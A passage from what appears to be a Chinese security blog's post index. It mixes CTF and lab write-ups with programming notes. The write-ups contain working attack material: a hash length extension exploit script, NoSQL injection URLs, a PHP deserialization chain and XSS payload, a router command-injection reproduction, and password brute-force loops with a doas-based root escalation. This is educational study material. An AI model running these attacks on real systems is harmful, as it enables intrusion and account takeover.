    <url>%2F2019%2F08%2F05%2Fwindows%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E5%99%A8%E7%A5%9E%E5%99%A8%2F</url>
    <content type="text"><![CDATA[一直很困惑不知道如何使用资源管理器，每次复制粘贴文件都需要同时打开多个资源管理器然后再emmmm，然后就会嫌资源管理器太多了就无脑x掉了，这时候就会发现mmp我刚打开的资源管理器呢。。。然后又要去找emmmm 于是去搜了一下用来增强资源管理器的工具找到了这个： QTTabBar 可以说是体验很棒了 网址 比如多标签页 再比如文件和文件夹预览 总之很棒就是了]]></content>
      <categories>
        <category>config</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>资源管理器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[初见哈希扩展攻击]]></title>
    <url>%2F2019%2F08%2F05%2F%E5%88%9D%E8%A7%81%E5%93%88%E5%B8%8C%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[目前还是太菜了，向师傅们好好学习 SSRF me 点开首页就是一长串代码, curl重定向保存到文件中,然后仔细分析了一下代码 程序主要涉及到三个参数,一个是param在get中,另外两个action和sign是通过cookie获得的 访问/geneSign可以得到sign的值, action可以是scan或read,但是在访问/De1ctf时,会检验sign是否正确,sign的生成算法： 12def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() 这其中secret_key是不知道的,并且gengeSign限制了action只能是scan,结合后来题目的提示是访问flag.txt,但是最多将这个文件读入result.txt,却不能读取出来。 这样想来是不是只能爆破secret_key了？但是secret_key又怎么会那么容易给你呢。。 这就涉及到我的知识盲区了,叫做哈希扩展攻击。。 先看实验吧一道例题 这题，注入不想注入，源码没扫出来，啥信息都没有？ 还是要多关注抓包的信息，尤其是数据包中出现了一些你都没有看过的东西的时候就要仔细看一看了 hhh没想到吧 原来可以通过这种方式获取到源代码。。 12345678910111213141516171819202122232425262728293031$flag = "XXXXXXXXXXXXXXXXXXXXXXX";$secret = "XXXXXXXXXXXXXXX"; // This secret is 15 characters long for security!$username = $_POST["username"];$password = $_POST["password"];if (!empty($_COOKIE["getmein"])) &#123; if (urldecode($username) === "admin" &amp;&amp; urldecode($password) != "admin") &#123; if ($COOKIE["getmein"] === md5($secret . urldecode($username . $password))) &#123; echo "Congratulations! You are a registered user.\n"; die ("The flag is ". $flag); &#125; else &#123; die ("Your cookies don't match up! STOP HACKING THIS SITE."); &#125; &#125; else &#123; die ("You are not an admin! LEAVE."); &#125;&#125;setcookie("sample-hash", md5($secret . urldecode("admin" . "admin")), time() + (60 * 60 * 24 * 7));if (empty($_COOKIE["source"])) &#123; setcookie("source", 0, time() + (60 * 60 * 24 * 7));&#125;else &#123; if ($_COOKIE["source"] != 0) &#123; echo ""; // This source code is outputted here &#125;&#125; empty函数 非空返回false，别想多了 关键在这里： if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) { 其中$secret是不知道的，$username和password是可以控制的，并且$secret的长度是15 哈希扩展攻击的原理之后再讨论，我们先分析这题咋搞 首先username必须是admin,password不能是admin那就随便输一个值比如cck 我们的目标很简单，就是绕过它 if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) { 所以目标就是让$COOKIE[&quot;getmein&quot;]和md5后的值相等，所以需要同时伪造两边的值天平才能平衡 而hashpump工具就是来干这个的： 第一个参数是md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;))的值，第二个参数是填充的数据，第三个参数是填充数据加key的长度，第四个参数是添加的数据。 这样就能同时生成天平左边和右边的值了 当然还需要URL编码一下 理解了这题那么这道De1ctf的题目也就好说了 参考ctftime上的exp代码如下： 123456789101112131415161718192021222324252627282930import requests,hashpumpy,urllib"""hashpump(hexdigest, original_data, data_to_add, key_length) -&gt; (digest, message)Arguments: hexdigest(str): Hex-encoded result of hashing key + original_data. original_data(str): Known data used to get the hash result hexdigest. data_to_add(str): Data to append key_length(int): Length of unknown data prepended to the hashReturns: A tuple containing the new hex digest and the new message.'"""payload = 'flag.txt'param = 'param=' + payloadbase_url = 'http://139.180.128.86/'signurl = base_url + 'geneSign?' + paramr = requests.post(url=signurl,cookies=&#123;'action':'scan'&#125;)sign = r.contentprint(sign)readsign,add_data = hashpumpy.hashpump(sign,payload+'scan','read',16)print(readsign)# print add_dataadd_data = add_data[len(payload):]print(add_data)expurl = base_url + 'De1ta?' + paramprint(urllib.parse.quote(add_data))r = requests.post(url=expurl,cookies=&#123;'action':urllib.parse.quote(add_data),'sign':readsign&#125;)print(r.content) 当然我用的是python3，并且注意urllib.parse.quote(add_data)方法 就成功了]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>hash</tag>
        <tag>De1ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[noSQL Injection]]></title>
    <url>%2F2019%2F08%2F04%2FnoSQL-Injection%2F</url>
    <content type="text"><![CDATA[cybrics noSQL 这道题是cybrics的一道web题，由于是第一次接触noSQL注入，所以单独拿出来好好研究一下 php操作mongodb的语法： 123456789// connect to mongodb$m = new MongoClient();// select a database$db = $m-&gt;test;// select collection$collection = $db-&gt;users;$cursor = $collection-&gt;find($data);$cursor = $collection-&gt;findone($data); 基本上就是实例化对象，选择数据库，选择表，然后开始查找 查询语法主要如下： 123456789db.user.find(&#123;'username': 'xxxppp'&#125;)//查找用户名不为admin且password为123456的用户db.user.find(&#123;'username':&#123;$ne:'admin'&#125;, 'password':'123456'&#125;)//正则匹配：db.customer.find(&#123;'name': &#123;'$regex':'.*s.*'&#125; &#125;)db.user.find(&#123;'username':/jrx/i&#125;) 这道题目首先可以用dirsearch发现是git源码泄露，之后用GitHacker.py获取到源码 查看index.php，首先要登陆，需要绕过auth函数 123456789function auth($username, $password) &#123; $collection = (new MongoDB\Client('mongodb://localhost:27017/'))-&gt;test-&gt;users; $raw_query = '&#123;"username": "'.$username.'", "password": "'.$password.'"&#125;'; $document = $collection-&gt;findOne(json_decode($raw_query)); if (isset($document) &amp;&amp; isset($document-&gt;password)) &#123; return true; &#125; return false;&#125; username和password都没有经过过滤就拼接了，但是这里有一个json_decode不太好过 如果没有json_decode函数，我们可以通过{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:{&quot;$ne&quot;:&quot;1&quot;}}绕过登陆的限制 于是这样做： 这样就绕过限制登陆了 来看第二个： 1234567891011121314151617&lt;?php $filter = $_GET['filter']; $collection = (new MongoDB\Client('mongodb://localhost:27017/'))-&gt;test-&gt;news; $pipeline = [ ['$group' =&gt; ['_id' =&gt; '$category', 'count' =&gt; ['$sum' =&gt; 1]]], ['$sort' =&gt; ['count' =&gt; -1]], ['$limit' =&gt; 5], ]; $filters = [ ['$project' =&gt; ['category' =&gt; $filter]] ]; $cursor = $collection-&gt;aggregate(array_merge($filters, $pipeline));?&gt; array_merge函数将$pipeline和filters进行合并 查找资料得知 在mongodb的aggregate中，可以使用$cond进行条件语句： 并且： 我们可以构造如下链接，匹配到flag时将其移除 http://173.199.118.226/index.php?filter[$cond][if][$eq][]=flags&amp;filter[$cond][if][$eq][]=$category&amp;filter[$cond][then]=$$REMOVE&amp;filter[$cond][else]=$category 利用条件语句，发现flags时，就输出其title： http://173.199.118.226/index.php?filter[$cond][if][$eq][]=flags&amp;filter[$cond][if][$eq][]=$category&amp;filter[$cond][then]=$title&amp;filter[$cond][else]=$category 从title中我们得知有text，那么读取： http://173.199.118.226/index.php?filter[$cond][if][$eq][]=flags&amp;filter[$cond][if][$eq][]=$category&amp;filter[$cond][then]=$text&amp;filter[$cond][else]=$category 就可以获得flag了 NoSQL注入实践 MongoDb作为一个NoSQL的数据库，操作其实还是很SQL很相似的 都有数据库，不同的是集合对应于表，文档对应于行，字段对应于列 这张图显示了映射关系： 于是操作MongoDb时可以理解为选择数据库，然后选择collection，然后构造查询语句进行查询 比如demo.html $m = new MongoClient()连接数据库，$db=$m-&gt;test选择test数据库，然后选择collection : $collection=$db-&gt;uses 构造的查询语句为： 12345$data = array( &apos;username&apos; =&gt; $_REQUEST[&apos;username&apos;], &apos;password&apos; =&gt; $_REQUEST[&apos;password&apos;] ); 之后进行查询： $cursor = $collection-&gt;find($data) 这里没有字符串的拼接，似乎无法注入，但是如果我们传入的username和password都是数组的话，那么查询的语句就会成为这样： 构造的URL：http://localhost/NoSQLI/login/login.php?username[$ne]=1&amp;password[$ne]=1&amp;login-submit=login 此时拼接的$data json_encode后得到： &quot;{&quot;username&quot;:{&quot;$ne&quot;:&quot;1&quot;},&quot;password&quot;:{&quot;$ne&quot;:&quot;1&quot;}}&quot; 参考 NoSQL注入总结(MongoDB) 019 CyBRICS CTF Quals wp]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>NoSQL</tag>
        <tag>cybrics</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[qwb复现]]></title>
    <url>%2F2019%2F08%2F03%2Fqwb%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[复现一些qwb的题目 upload 可以通过dirsearch找到泄露的源码 ， -u指定url， -e指定插件 如果是代码审计题，而且是文件很多的，需要找到利用点，我们直接搜索unserialize找到一处可以利用的代码： 123456789101112public function login_check()&#123; $profile=cookie('user'); //获取到cookie中的user值 if(!empty($profile))&#123; $this-&gt;profile=unserialize(base64_decode($profile)); //直接反序列化 $this-&gt;profile_db=db('user')-&gt;where("ID",intval($this-&gt;profile['ID']))-&gt;find(); if(array_diff($this-&gt;profile_db,$this-&gt;profile)==null)&#123; return 1; &#125;else&#123; return 0; &#125; &#125; &#125; 接下来去寻找哪里调用了这个方法，在Profile这个类中 123456789public function upload_img()&#123; if($this-&gt;checker)&#123; if(!$this-&gt;checker-&gt;login_check())&#123; $curr_url="http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."/index"; $this-&gt;redirect($curr_url,302); exit(); &#125; &#125; ... upload_img方法会调用login_check反序列化 而这个操作中的 $this-&gt;ext、$this-&gt;filename_tmp、$this-&gt;filename 均可通过反序列化控制。 同时在Profile.php文件的末尾还有一处 1234567891011public function __get($name)&#123; return $this-&gt;except[$name];&#125;public function __call($name, $arguments)&#123; if($this-&gt;&#123;$name&#125;)&#123; $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments); &#125;&#125; 这两个函数的意思是如果访问了类中的private属性，就会调用__get方法，如果调用了类中不存在的方法，就会通过__call对$this-&gt;name所指向的方法进行调用 意味着我们可以调用任意的类方法 同时在Register.php中有一处： 123456public function __destruct()&#123; if(!$this-&gt;registed)&#123; $this-&gt;checker-&gt;index(); &#125;&#125; 首先上传一个图片马，之后通过Register类的__destruct方法，调用__get方法得到函数名upload_img，再调用__call方法，通过调用upload_img可以对图片马进行改名 如果我们将$this-&gt;checker赋值为Profile类，由于Profile类中不存在index方法，就会触发__call，这样就能构造一条完成的攻击链 高明的黑客 1234567891011121314151617181920212223242526272829import os,reimport requestsfilenames = os.listdir('/var/www/html/src')pattern = re.compile(r"\$_[GEPOST]&#123;3,4&#125;\[.*\]")for name in filenames: print(name) with open('/var/www/html/src/'+name,'r') as f: data = f.read() result = list(set(pattern.findall(data))) for ret in result: try: command = 'uname' flag = 'Linux' # command = 'phpinfo();' # flag = 'phpinfo' if 'GET' in ret: passwd = re.findall(r"'(.*)'",ret)[0] r = requests.get(url='http://127.0.0.1:8888/' + name + '?' + passwd + '='+ command) if flag in r.text: print('backdoor file is: ' + name) print('GET: ' + passwd) elif 'POST' in ret: passwd = re.findall(r"'(.*)'",ret)[0] r = requests.post(url='http://127.0.0.1:8888/' + name,data=&#123;passwd:command&#125;) if flag in r.text: print('backdoor file is: ' + name) print('POST: ' + passwd) except : pass]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>web</tag>
        <tag>thinkphp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DIR-823G复现]]></title>
    <url>%2F2019%2F08%2F03%2FDIR-823G%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[Dlink DIR-823G漏洞复现(CVE-2019-7298, CVE-2019-7297) binwale提取文件 文件下载地址 之后进行固件的模拟， 成功ping通网络 第一次进入路由器需要需要进行一些设置页面，查看是否有未授权访问的情况 导出配置文件（信息泄露）。 &lt;!-- --&gt; 浏览器访问直接弹出了下载页面 导出配置文件， 获取到系统信息 goahead程序分析(命令注入) 在查看固件的bin目录时发现了一个goahead的程序，说明此路由器是通过goahead进行开发的 拖入到IDA中进行分析，发现0x42424C处注册了处理函数 抓取到登陆的数据包，是发往/HNAP1/的 分析/HNAP1 处理函数的逻辑。 函数位于0x42383C 在这个部分，从函数表中进行遍历，寻找函数 函数表如下： 找到了需要调用的处理函数后，会首先记录 POST 的原始报文, 首先用 snprintf 生成命令， 然后使用 system 执行。 我们可以通过直接注入 ' 来命令执行 验证一下： 参考 DIR-823G HNAP_Entry_Func]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>goahead</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python文档阅读笔记3]]></title>
    <url>%2F2019%2F07%2F31%2Fpython%E6%96%87%E6%A1%A3%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B03%2F</url>
    <content type="text"><![CDATA[python文件操作 读文件，使用open函数打开一个文件 如果不指定模式，则默认以 text mode 打开 这意味着从文件中读取或写入字符串时，都会以指定的编码方式进行编码。如果未指定编码格式，默认值与平台相关 read()方法，可选参数size，当 size 被省略或者为负的时候，将读取并返回文件的整个内容 readline()方法，从文件中读取一行 如果要遍历文件，可以采取遍历文件对象的方式： 12&gt;&gt;&gt; for line in f:... print(line, end='') 这种实现方式比较高效 在编写脚本的过程中，注意文件的打开方式，编码这些小细节 写文件 f.write(string) 会把 string 的内容写入到文件中，并返回写入的字符数。 f.tell() 返回一个整数，给出文件对象在文件中的当前位置，表示为二进制模式下时从文件开始的字节数，以及文本模式下的不透明数字。]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cybrics复现]]></title>
    <url>%2F2019%2F07%2F31%2Fcybrics%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[目前太菜了，没做出几道cybrics的题目，趁着题目还在复现一波 Zakukozh 下载地址 下载了一个文件，于是想查看文件类型： zakukozh.bin: data 题目中有提示说是affine cipher affine cipher中文翻译过来就是放射密码，可以理解成简单的替换加密，比如wikipedia上举出的栗子 一个大小为m的字母表，通过变换 $E(x) = (ax+b) mod , m$ 得到密文 查看文件的十六进制形式，学习一些hexdump命令 1234567891011pxy@LAPTOP-UBIEP4K5  /mnt/f/1.ctf/cybrics/crypto  hexdump -C zakukozh.bin| head00000000 60 09 eb 82 1c ef df ef 59 59 59 1c a0 91 55 27 |`.......YYY...U&apos;|00000010 59 59 77 bc 59 59 59 2e d1 77 59 59 59 a9 44 38 |YYw.YYY..wYYY.D8|00000020 31 59 59 59 68 16 27 82 37 59 8b 6b fd 00 59 59 |1YYYh.&apos;.7Y.k..YY|00000030 59 95 62 28 dc 28 59 59 b8 ba fe 1d 08 a4 59 59 |Y.b(.(YY......YY|00000040 59 e0 e9 91 90 16 59 59 2b c6 59 59 2b c6 68 02 |Y.....YY+.YY+.h.|00000050 da 31 35 59 59 fe 7e a0 55 28 45 61 db 3c 3d 10 |.15YY.~.U(Ea.&lt;=.|00000060 08 a6 a1 a3 a4 89 ab 3e 68 b0 1b 82 a6 35 fd cd |.......&gt;h....5..|00000070 1c e0 d9 de 59 67 7f e3 45 70 b0 e2 e6 22 55 17 |....Yg..Ep...&quot;U.|00000080 32 d9 de 3e 87 1d d2 c2 59 51 e7 e6 59 49 a2 82 |2..&gt;....YQ..YI..|00000090 68 39 eb ab 77 19 7d fd a4 d9 a1 b0 ef 59 f8 07 |h9..w.&#125;......Y..| 查看十六进制数据如上，根据题目的提示，这就是仿射加密之后的结果，那么如何确定a,b,m这三个参数 由于是二进制数据，那么m就是256 a和b就通过爆破来解决 脚本如下： 123456789101112def reffine(a, b, c): return chr((a * (ord(c) - b)) % 256)with open('zakukozh.bin') as f: encrypted = f.read()for i in range(256): for j in range(256): decrypted = ''.join([reffine(i, j, c) for c in encrypted]) with open('output/dec_&#123;&#125;_&#123;&#125;.out'.format(i, j), 'wb') as f: f.write(decrypted) 就是跑的太慢了 😂]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>cybrics</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[redis源码阅读——dict]]></title>
    <url>%2F2019%2F07%2F30%2Fredis%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E2%80%94%E2%80%94dict%2F</url>
    <content type="text"><![CDATA[dict类型 先看宏定义 最基本的是dict类型，如下： 1234567typedef struct dict &#123; dictType *type; void *privdata; dictht ht[2]; PORT_LONG rehashidx; /* rehashing not in progress if rehashidx == -1 */ int iterators; /* number of iterators currently running */&#125; dict; dictType 是一个结构体，包含了dict的一些基础方法 privdata 是私有数据 dictht 是哈希表 rehashidx 代表是否在进行重哈希，如果不为-1则代表正在进行重哈希 iterators 代表迭代器，暂时还不太理解 接下来看哈希表的结构(dictht): 123456typedef struct dictht &#123; dictEntry **table; PORT_ULONG size; PORT_ULONG sizemask; PORT_ULONG used;&#125; dictht; table是一个指向dictEntry的二级指针 size代表哈希表的大小 sizemask 总是等于size-1 used代表该哈希表已有的节点数量 这是dictht的构造： 不过这里为什么要二级指针呢？ 可以这样理解，因为dictEntry *本身就是一个一级指针，同时table指向的又是一个指针数组，所以这里需要二级指针了 复习一下数组指针和指针数组的概念 数组指针，本质上还是指针 int (*p)[n] ()运算优先级更高，*优先与p结合，p还是一个指针，不过p指向的是一个数组，这时候p+1运算的步长就是n,故这样的指针也叫行指针 指针数组 int *p[n] []优先级更高，p先与方括号结合，这时候p代表的是一个数组，这个数组中每个元素都是一个指针，故此时p就是二级指针 之后继续看dictEntry类型 12345678910typedef struct dictEntry &#123; void *key; union &#123; void *val; uint64_t u64; int64_t s64; double d; &#125; v; struct dictEntry *next;&#125; dictEntry; 这里面存储了key-value键值对，其中key是一个void*类型的指针，可以代表任意类型的数据，但是value是一个联合体，可以在指针，整数和浮点数中取值 next属性是指向另一个哈希表节点的指针， 这个指针可以将多个哈希值相同的键值对连接在一次， 以此来解决键冲突（collision）的问题 参考 字典的实现 Redis内部数据结构详解(1)——dict 数组指针和指针数组的区别]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>redis</tag>
        <tag>dict</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[redis源码阅读——sds]]></title>
    <url>%2F2019%2F07%2F30%2Fredis%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E2%80%94%E2%80%94sds%2F</url>
    <content type="text"><![CDATA[从redis源码开始 都说写代码是在表达自己，阅读代码是在理解别人，尤其是阅读高质量的源代码，于是便从头开始读起了redis的源码]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>redis</tag>
        <tag>sds</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[靶机渗透]]></title>
    <url>%2F2019%2F07%2F30%2F%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%2F</url>
    <content type="text"><![CDATA[fourandsix2靶机 一开机就可以看到IP地址位192.168.41.132 然后nmap开始扫描 nmap -A -n -v -Pn -A 192.168.41.132 -A Enable OS detection, version detection, script scanning, and traceroute -n -n/-R: Never do DNS resolution/Always resolve [default: sometimes] -Pn Treat all hosts as online -- skip host discovery 扫描的报告： 1234567891011121314151617181920212223242526272829303132Nmap scan report for 192.168.41.132Host is up (0.00059s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9 (protocol 2.0)| ssh-hostkey:| 2048 ef:3b:2e:cf:40:19:9e:bb:23:1e:aa:24:a1:09:4e:d1 (RSA)| 256 c8:5c:8b:0b:e1:64:0c:75:c3:63:d7:b3:80:c9:2f:d2 (ECDSA)|_ 256 61:bc:45:9a:ba:a5:47:20:60:13:25:19:b0:47:cb:ad (ED25519)111/tcp open rpcbind 2 (RPC #100000)| rpcinfo:| program version port/proto service| 100000 2 111/tcp rpcbind| 100000 2 111/udp rpcbind| 100003 2,3 2049/tcp nfs| 100003 2,3 2049/udp nfs| 100005 1,3 780/udp mountd|_ 100005 1,3 917/tcp mountd2049/tcp open nfs 2-3 (RPC #100003)MAC Address: 00:0C:29:81:23:53 (VMware)Device type: general purposeRunning: OpenBSD 6.XOS CPE: cpe:/o:openbsd:openbsd:6OS details: OpenBSD 6.0 - 6.1Uptime guess: 0.000 days (since Sat Jul 20 02:04:15 2019)Network Distance: 1 hopTCP Sequence Prediction: Difficulty=258 (Good luck!)IP ID Sequence Generation: RandomizedTRACEROUTEHOP RTT ADDRESS1 0.59 ms 192.168.41.132 难得一次nmap可以扫出这么多信息 看到靶机开放了2049号端口，是nfs服务，那么尝试扫描可以挂载的目录 -sV : Probe open ports to determine service/version info nmap -sV --script=nfs-showmount 192.168.41.132 扫描可以挂载的目录 结果： 123456789101112131415PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9 (protocol 2.0)111/tcp open rpcbind 2 (RPC #100000)| nfs-showmount:|_ /home/user/storage| rpcinfo:| program version port/proto service| 100000 2 111/tcp rpcbind| 100000 2 111/udp rpcbind| 100003 2,3 2049/tcp nfs| 100003 2,3 2049/udp nfs| 100005 1,3 780/udp mountd|_ 100005 1,3 917/tcp mountd2049/tcp open nfs 2-3 (RPC #100003)MAC Address: 00:0C:29:81:23:53 (VMware) 很好，那就可以挂载目录了 12root@kali:~# nfspysh -o server=192.168.41.132:/home/user/storage /tmp/test/nfspy@192.168.41.132:/home/user/storage:/&gt; nfspysh的用法： 12345678root@kali:~# nfspysh -hUsage: nfspysh [options]Options: -h, --help show this help message and exit -l List mount options available -o OPTIONS Mount options as in nfspy -c COMMAND Semicolon-separated commands to run (batch mode) 目录下有一个压缩包 get backup.7z 然后尝试用7z去解压缩，但是有密码 于是用john去破解 然而爆破有点慢 不过密码就是chocolate ps.kali里面其实有很多字典的，比如/usr/share/john/password.lst 解压缩之后得到的是一个公钥和私钥 通过下面这段脚本爆破出密码是12345678 12root@kali:/tmp# cat /usr/share/john/password.lst | while read pass; do if ssh-keygen -c -C &quot;user@192.168.41.132&quot; -P $pass -f id_rsa &amp;&gt;/dev/null; then echo $pass; break; fi; done12345678 然后就可以登陆了 ssh -i id_rsa user@192.168.41.132 之前一直尝试没登陆成功，因为我忘记赋权了 也就是 chmod 600 id_rsa 然后就可以登陆了： 1234567891011121314root@kali:/tmp# ssh -i id_rsa user@192.168.41.132Enter passphrase for key &apos;id_rsa&apos;:Last login: Mon Oct 29 13:53:51 2018 from 192.168.1.114OpenBSD 6.4 (GENERIC) #349: Thu Oct 11 13:25:13 MDT 2018Welcome to OpenBSD: The proactively secure Unix-like operating system.Please use the sendbug(1) utility to report bugs in the system.Before reporting a bug, please try to reproduce it with the latestversion of the code. With bug reports, please try to ensure thatenough information to reproduce the problem is enclosed, and if aknown fix for it exists, include that as well.fourandsix2$ 如下是错误的做法： 1234567root@kali:/tmp# ssh -i id_rsa user@192.168.41.132@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ WARNING: UNPROTECTED PRIVATE KEY FILE! @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Permissions 0777 for &apos;id_rsa&apos; are too open.It is required that your private key files are NOT accessible by others.This private key will be ignored. 登陆之后 没办法直接访问root文件夹 12fourandsix2$ ls /root/ls: /root/: Permission denied 接下来这波操作很不明白 输入 doas /usr/bin/less /var/log/authlog 然后按v进入编辑模式 之后输入:!/bin/sh 于是就提权了 12fourandsix2# whoamiroot 成功了 1234567891011fourandsix2# cat /root/flag.txt Nice you hacked all the passwords!Not all tools worked well. But with some command magic...:cat /usr/share/wordlists/rockyou.txt|while read line; do 7z e backup.7z -p&quot;$line&quot; -oout; if grep -iRl SSH; then echo $line; break;fi;donecat /usr/share/wordlists/rockyou.txt|while read line; do if ssh-keygen -p -P &quot;$line&quot; -N password -f id_rsa; then echo $line; break;fi;doneHere is the flag:acd043bc3103ed3dd02eee99d5b0ff42 补充提权的过程： 在/etc/doas.conf文件中有这些内容 所以可以用doas命令查看authlod文件 同时，通过编辑它，进入了shell 参考 FourAndSix2.01靶机渗透]]></content>
      <categories>
        <category>vulstudy</category>
      </categories>
      <tags>
        <tag>靶机</tag>
        <tag>nfs</tag>
        <tag>nmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php反序列化笔记]]></title>
    <url>%2F2019%2F07%2F30%2Fphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[php 反序列化 先看一个栗子： 12345678910&lt;?phpclass Test&#123; public $name = "pxy"; private $sex = "secret"; protected $age = "20";&#125;$test1 = new Test();$object = serialize($test1);print_r($object); 序列化之后得到的结果是： O:4:&quot;Test&quot;:3:{s:4:&quot;name&quot;;s:3:&quot;pxy&quot;;s:9:&quot;Testsex&quot;;s:6:&quot;secret&quot;;s:6:&quot;*age&quot;;s:2:&quot;20&quot;;} O代表是对象，Test是类名，之后是属性，不同类型的属性其实序列化之后得到的结果是不一样的。 看官方文档，解释了为什么需要序列化这种操作： serialize() 返回字符串，此字符串包含了表示 value 的字节流，可以存储于任何地方。 这有利于存储或传递 PHP 的值，同时不丢失其类型和结构。 同时提到了一个魔术方法： 当序列化对象时，PHP 将试图在序列动作之前调用该对象的成员函数 __sleep()。这样就允许对象在被序列化之前做任何清除操作。类似的，当使用 unserialize() 恢复对象时， 将调用 __wakeup() 成员函数。 __sleep()和__wakeup()两个方法很形象地说明了什么时候调用。 然后我就犯了一个新手很常见的错误： __sleep()方法必须是要返回一个array地 原来。。__sleep()方法是这样子调用的啊 123456789&lt;?phpclass Test&#123; public $name = "pxy"; private $sex = "secret"; protected $age = "20"; function __sleep()&#123; return array('name', 'sex', 'age'); &#125;&#125; 实际追踪一下为什么会出现反序列化 调试代码如下: 12345678910&lt;?phpclass test&#123; public $target = "this is a test"; function __destruct()&#123; echo $this-&gt;target; &#125;&#125;$a = $_GET['b'];$c = unserialize($a); 利用思路：传入的参数是可控的，并且这里还有一个test类和一个__destruct()魔术方法。 那就是构造这个对象将其序列化之后传入，之后会自动反序列化同时在对象销毁的时候就会自动执行魔术方法了 我们这样来写： 1234567&lt;?class test&#123; public $target = "&lt;script&gt;alert('xss');&lt;/script&gt;";&#125;$object = new test();print_r(serialize($object)); 突然觉得序列化也有一点变量覆盖的味道，我在外部构造的类实例化的对象进入代码之后覆盖了原来的对象？ 调试过程如下： 生成的序列化字符串如下： O:4:&quot;test&quot;:1:{s:6:&quot;target&quot;;s:30:&quot;&lt;script&gt;alert('xss');&lt;/script&gt;&quot;;} 然后将其作为参数传入进去: http://localhost/test/testUnserialize0.php?b=O:4:%22test%22:1:{s:6:%22target%22;s:30:%22%3Cscript%3Ealert%28%27xss%27%29;%3C/script%3E%22;} 此时接收到了参数： $a的值为：&quot;O:4:&quot;test&quot;:1:{s:6:&quot;target&quot;;s:30:&quot;&lt;script&gt;alert('xss');&lt;/script&gt;&quot;;}&quot; 继续单步步入： 这个时候就会去调用魔术方法了 xss框框就弹出来啦。 接下来继续研究剩下的魔术方法：先看几个简单的 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;?phpclass test&#123; public $name = 'P2hm1n'; function __construct()&#123; echo "__construct()\n"; &#125; function __destruct()&#123; echo "__destruct()\n"; &#125; function __wakeup()&#123; echo "__wakeup()\n"; &#125; function __toString()&#123; return "__toString()"."\n"; &#125; function __sleep()&#123; echo "__sleep()\n"; return array("name"); &#125; function __call($funName, $argument)&#123; echo "调用方法".$funName."(:"."参数:"; print_r($argument); echo "不存在！\n"; &#125; public static function __callStatic($funName, $argument)&#123; echo "调用静态方法".$funName."(:"."参数:"; print_r($argument); echo "不存在！\n"; &#125;&#125;$test1 = new test();test::hello("nihao"); //不实例化对象，此时调用的是静态方法$test1-&gt;hello("nihao"); //实例化对象$test2 = serialize($test1);$test3 = unserialize($test2);print($test3); 输出的结果如下： 123456789101112131415调用静态方法hello(:参数:Array( [0] =&gt; nihao)不存在！调用方法hello(:参数:Array( [0] =&gt; nihao)不存在！__sleep()__wakeup()__toString()__destruct()__destruct() 这几个方法都还挺好区分的，比较难区分的就是__call()和__callStatic()方法了。 TODO 十六个魔术方法详解]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php-manual-note-0]]></title>
    <url>%2F2019%2F07%2F30%2Fphp-manual-note-0%2F</url>
